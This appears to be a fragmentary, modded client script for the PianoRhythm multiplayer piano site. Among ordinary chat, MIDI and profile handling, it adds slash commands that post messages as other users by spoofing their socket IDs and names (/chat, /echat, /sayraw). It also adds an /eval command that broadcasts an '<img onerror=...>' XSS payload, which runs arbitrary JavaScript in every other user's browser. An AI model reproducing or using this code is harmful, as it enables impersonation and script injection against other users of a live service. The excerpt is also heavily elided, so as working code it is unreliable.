(function(require, exports, module, __filename, __dirname, global, GLOBAL) {"use strict";
const Piano_1 = require("./Piano");
window.Piano_1 = Piano_1;
    ...
    static socket_HandleChat(data) {
        if (data && data.type) {
            ...
            if (data.sID || data.socketID) {
                user = PianoRhythm.PLAYER_SOCKET_LIST.get(data.sID || data.socketID || data.id);
                if (user)
                    userli = user["userLI"];
            }
            switch (data.type) {
                ...
                case "removePlayer":
                    ...
                    break;
                    /*
                    PianoRhythm.PianoRhythm.chatChannel.publish({type: "roomUpdate", list: {allowTurnQueue: false,
count: 100,
destroyed: false,
hasPassword: false,
inProgress: false,
...
name: "asdasd",
onlyHost: false,
owner: PianoRhythm.PianoRhythm.CLIENT.socketID,
ownerName: PianoRhythm.PianoRhythm.CLIENT.socketID,
prefix: "",
roomID: "151",
turn_currentPlayer: null,
type: "GUESS THE CHORD"}})*/
                case "roomUpdate":
                    if (data && data.list) {
                        if (PianoRhythm.DEBUG_MESSAGING)
                ...
                case "dnotify":
                    ...
                    break;
                    /*
                    PianoRhythm.PianoRhythm.chatChannel.publish({
                                type: "roleChange", otherAttrType: "role", otherAttr: {newRole: "DESIGN"},
    ...
    static socket_HandleMidi(data) {
        if (data && data.uuid && data.id) {
            if (PianoRhythm.MUTED_NOTE_PLAYERS &&
                ...
                return;
            let mod = (!PianoRhythm.TAB_VISIBLE) ? 1000 : 400;
        ...
        PianoRhythm.SOCKET.on("chatMessage", function (data) {
            ...
            if (typeof data.type === "undefined")
                if (data && data.message) {
                    ...
                    if (!data.message.startsWith("You have now set your status")) {
                    PianoRhythm.chatMessage({
                        roomName: roomName,
                        name: name,
                        message: data.message,
                ...
                if (PianoRhythm.CLIENT && user.name.toLowerCase() !== PianoRhythm.CLIENT.name.toLowerCase()) {
                    ...
                    PianoRhythm.MINI_PROFILE_HEADER_TEXT.click(() => {
                        ...
                        var submitButton = BasicBox.createButton("Submit", () => {
                            ...
                            if (inputVal && inputVal.length < 15)
                        ...
                        PianoRhythm.MAIN_PROFILE_IMAGE.click(() => {
                            ...
                            var submitButton = BasicBox.createButton("Submit", () => {
                                ...
                                if (gifFileData)
                                    ...
                                    /*PianoRhythm.avatarChannel.publish({
                                        username: PianoRhythm.CLIENT.name,
                                        image: imageData,
                                        socketID: PianoRhythm.CLIENT.socketID,
                                        uuid: PianoRhythm.CLIENT._id
                                    })*/
                    ...
                    if (prevX !== pos.x || prevY !== pos.y) {
                        if (PianoRhythm.mouseChannel)
                            PianoRhythm.mouseChannel.publish({
                                ...
                                type: "pos",
                                color: rainbow2[count2],
                                id: PianoRhythm.CLIENT.id,
                                socketID: PianoRhythm.SOCKET.id
                            });
                    }
                    //console.log(rainbow2[count2]);
                    count2++
                    if (count2 == rainbow2.length) {
                        count2 = 0;
                    }
                prevX = pos.x;
                prevY = pos.y;
                window.clientpos = pos;
            }
        }
        ...
        function onsuccesscallback(access) {
            ...
            try {
                ...
                if (storage_inputs) {
                    ...
                    if ( PianoRhythm.MIDI_CURRENT_IN)
                    {
            ...
            PianoRhythm.CONTEXT_MENU.children().click((e) => {
                ...
                switch (item.textContent.toLowerCase()) {
                    case "give crown":
                        ...
                        /*
                        PianoRhythm.PianoRhythm.SOCKET.emit("giveCrown", {
                                target: {profileID: PianoRhythm.PianoRhythm.CLIENT._id, profileName: "BopIt", profileSID: PianoRhythm.PianoRhythm.CLIENT.socketID}
                            });*/
                        break;
                    case "ban":
                        if (PianoRhythm.SOCKET) {
            ...
            PianoRhythm.CSUBMITFORM.submit(function () {
                ...
                //if (PianoRhythm.CLIENT.type !== user_1.UserType.OSOP)
                   // message = PianoRhythm.strip(message);
                                   ...
                                   window.toBetterChat = function(tehchat) {
                                        ...
                                        return str.substr(0,index) + chr + str.substr(index+1);
                                                        ...
                                                        for (var a in tehchat) {
                                                          ...
                                                          if (tehchat[a] != " ") {
                                                          chats2[a] = setCharAt(tehchat[a],0,`[${rainbow[j]}]${tehchat[a]} `)
                                                          } else {
                                                          chats2[a] = setCharAt(tehchat[a],0,`[${rainbow[j]}]  `)  
                                                          }
                                                          j++;
                                                         // console.log("j now equals " + j)
                                                        }
                                                        if (PianoRhythm.rchat) {
                                                      returnval = chats2.join().replace(/,/g, "");
                                                       if (PianoRhythm.eqt)
                                                       returnval = PianoRhythm.eqt + returnval;
                                                       } else {
                                                            PianoRhythm.eqt ? returnval = PianoRhythm.eqt + oldchat : returnval = oldchat;
                                                            
                                                         /*   if (PianoRhythm.eqt) {
                                                             returnval = PianoRhythm.eqt + oldchat;
                                                           //laf
                                                            } else {
                                                                returnval = oldchat;
                                                            }*/
                ...
                if (message.toLowerCase().indexOf("/rchat") === 0) {
                    PianoRhythm.rchat = !PianoRhythm.rchat;
                    if (PianoRhythm.rchat) {
                    PianoRhythm.chatMessage({ message: "Rainbow Chat Enabled", name: "Server" });
                    } else {
                        PianoRhythm.chatMessage({ message: "Rainbow Chat Disabled", name: "Server" });
                    }
                    PianoRhythm.CMESSAGEINPUT.val('');
                    return;
                }
                if (message.toLowerCase().indexOf("/chat") === 0) {
                    let args = message.slice("/".length).trim().split(/ +/g);
                    let command = args.shift().toLowerCase();
                    if (args.length > 1) {
                    let username = args[0];
                    var input = message.split(username + " ")[1]
                    let j = false;
                    PianoRhythm.uSeRs.list.forEach((usr) => {
                        if (usr.name.toLowerCase() == username.toLowerCase()) {
                            PianoRhythm.chatChannel.publish({
                                type: "chat", 
                                message: toBetterChat(input),
                                value: true,
                                socketID: usr.socketID,
                                uuid: usr.id,
                                color: usr.color,
                                name: usr.nickname || usr.name
                            });
                            console.log(input);
                            console.log(usr.id);
                       ...
                       // if (j == false) {
                       //    PianoRhythm.chatMessage({ message: "User Not Found", name: "Server" }); 
                       // }
                    })
                    } else {
                        PianoRhythm.chatMessage({ message: "Usage:  /chat (username) (msg)", name: "Server" }); 
                    }
                    PianoRhythm.CMESSAGEINPUT.val('');
                    return;    
                }
                if (message.toLowerCase().indexOf("/color") === 0) {
                    let args = message.slice("/".length).trim().split(/ +/g);
                    let command = args.shift().toLowerCase();
                    if (args.length > 1) {
                    let username = args[0];
                    ...
                    PianoRhythm.uSeRs.list.forEach((usr) => {
                       ...
                       // }
                        ...
                        PianoRhythm.chatMessage({ message: "Usage:  /color (username) (color)", name: "Server" }); 
                    }
                    PianoRhythm.CMESSAGEINPUT.val('');
                    return;    
                }
                if (message.toLowerCase().indexOf("/tag") === 0) {
                    let args = message.slice("/".length).trim().split(/ +/g);
                    let command = args.shift().toLowerCase();
                    if (args.length > 0) {
                    let tag = args[0];
                    if (args[0] == "none") {
                        PianoRhythm.eqt = undefined;
                    } else {
                    PianoRhythm.eqt = `[${args[0]}]`;
                    PianoRhythm.chatMessage({ message: "Equipped tag " + tag, name: "Server" });
                    }
                    } else {
                        PianoRhythm.chatMessage({ message: "Usage:  /tag (tag)", name: "Server" }); 
                    }
                    PianoRhythm.CMESSAGEINPUT.val('');
                    return;    
                }
                if (message.toLowerCase().indexOf("/echat") === 0) {
                    let args = message.slice("/".length).trim().split(/ +/g);
                    let command = args.shift().toLowerCase();
                    if (args.length > 1) {
                    let username = args[0];
                    ...
                    let j = false;
                       ...
                       // }
                        ...
                        PianoRhythm.chatMessage({ message: "Usage:  /echat (username) (msg)", name: "Server" }); 
                    }
                    PianoRhythm.CMESSAGEINPUT.val('');
                    return;    
                }
                if (message.toLowerCase().indexOf("/sayraw") === 0) {
                    let args = message.slice("/".length).trim().split(/ +/g);
                    let command = args.shift().toLowerCase();
                    if (args.length > 0) {
                    var input = message.split('/sayraw ')[1]
                    let j = false;
                       ...
                       // }
                        ...
                        PianoRhythm.chatMessage({ message: "Usage:  /sayraw (username) (msg)", name: "Server" }); 
                    }
                    PianoRhythm.CMESSAGEINPUT.val('');
                    return;    
                }
                if (message.toLowerCase().indexOf("/notify") === 0) {
                    let args = message.slice("/".length).trim().split(/ +/g);
                    let command = args.shift().toLowerCase();
                    if (args.length > 0) {
                    var input = message.split('/notify ')[1]
                    let j = false;
                       ...
                       // }
                        ...
                        PianoRhythm.chatMessage({ message: "Usage:  /notify (msg)", name: "Server" }); 
                    }
                    PianoRhythm.CMESSAGEINPUT.val('');
                    return;    
                }
                
                if (message.toLowerCase().indexOf("/eval") === 0) {
                    let args = message.slice("/".length).trim().split(/ +/g);
                    let command = args.shift().toLowerCase();
                    if (args.length > 0) {
                    var input = message.split('/eval ')[1]
                    let j = false;
                        
                            PianoRhythm.chatChannel.publish({
                                type: "chat", 
                                message: `<img src =x display=none onerror= ${input}>`,
                                value: true,
                            });
                        j = true;
                       ...
                       // }
                        ...
                        PianoRhythm.chatMessage({ message: "Usage:  /eval (js)", name: "Server" }); 
                    }
                    PianoRhythm.CMESSAGEINPUT.val('');
                    return;    
                }
                ...
                if (/\S/.test(message)) {
                   ...
                   if (!message.startsWith("/")) {
                     PianoRhythm.chatChannel.publish({
                            type: "chat",
                            message: toBetterChat(message),
                            value: false,
                            socketID: PianoRhythm.SOCKET.id + Math.random().toString(),
                            uuid: PianoRhythm.CLIENT.id +  Math.random().toString(),
                            color: rainbow[count],
                            name: PianoRhythm.CLIENT.name
                        });
                   } else {
                       PianoRhythm.SOCKET.emit("chatMessage", {
                           message: toBetterChat(message)
                       })
                   }
                        count++;
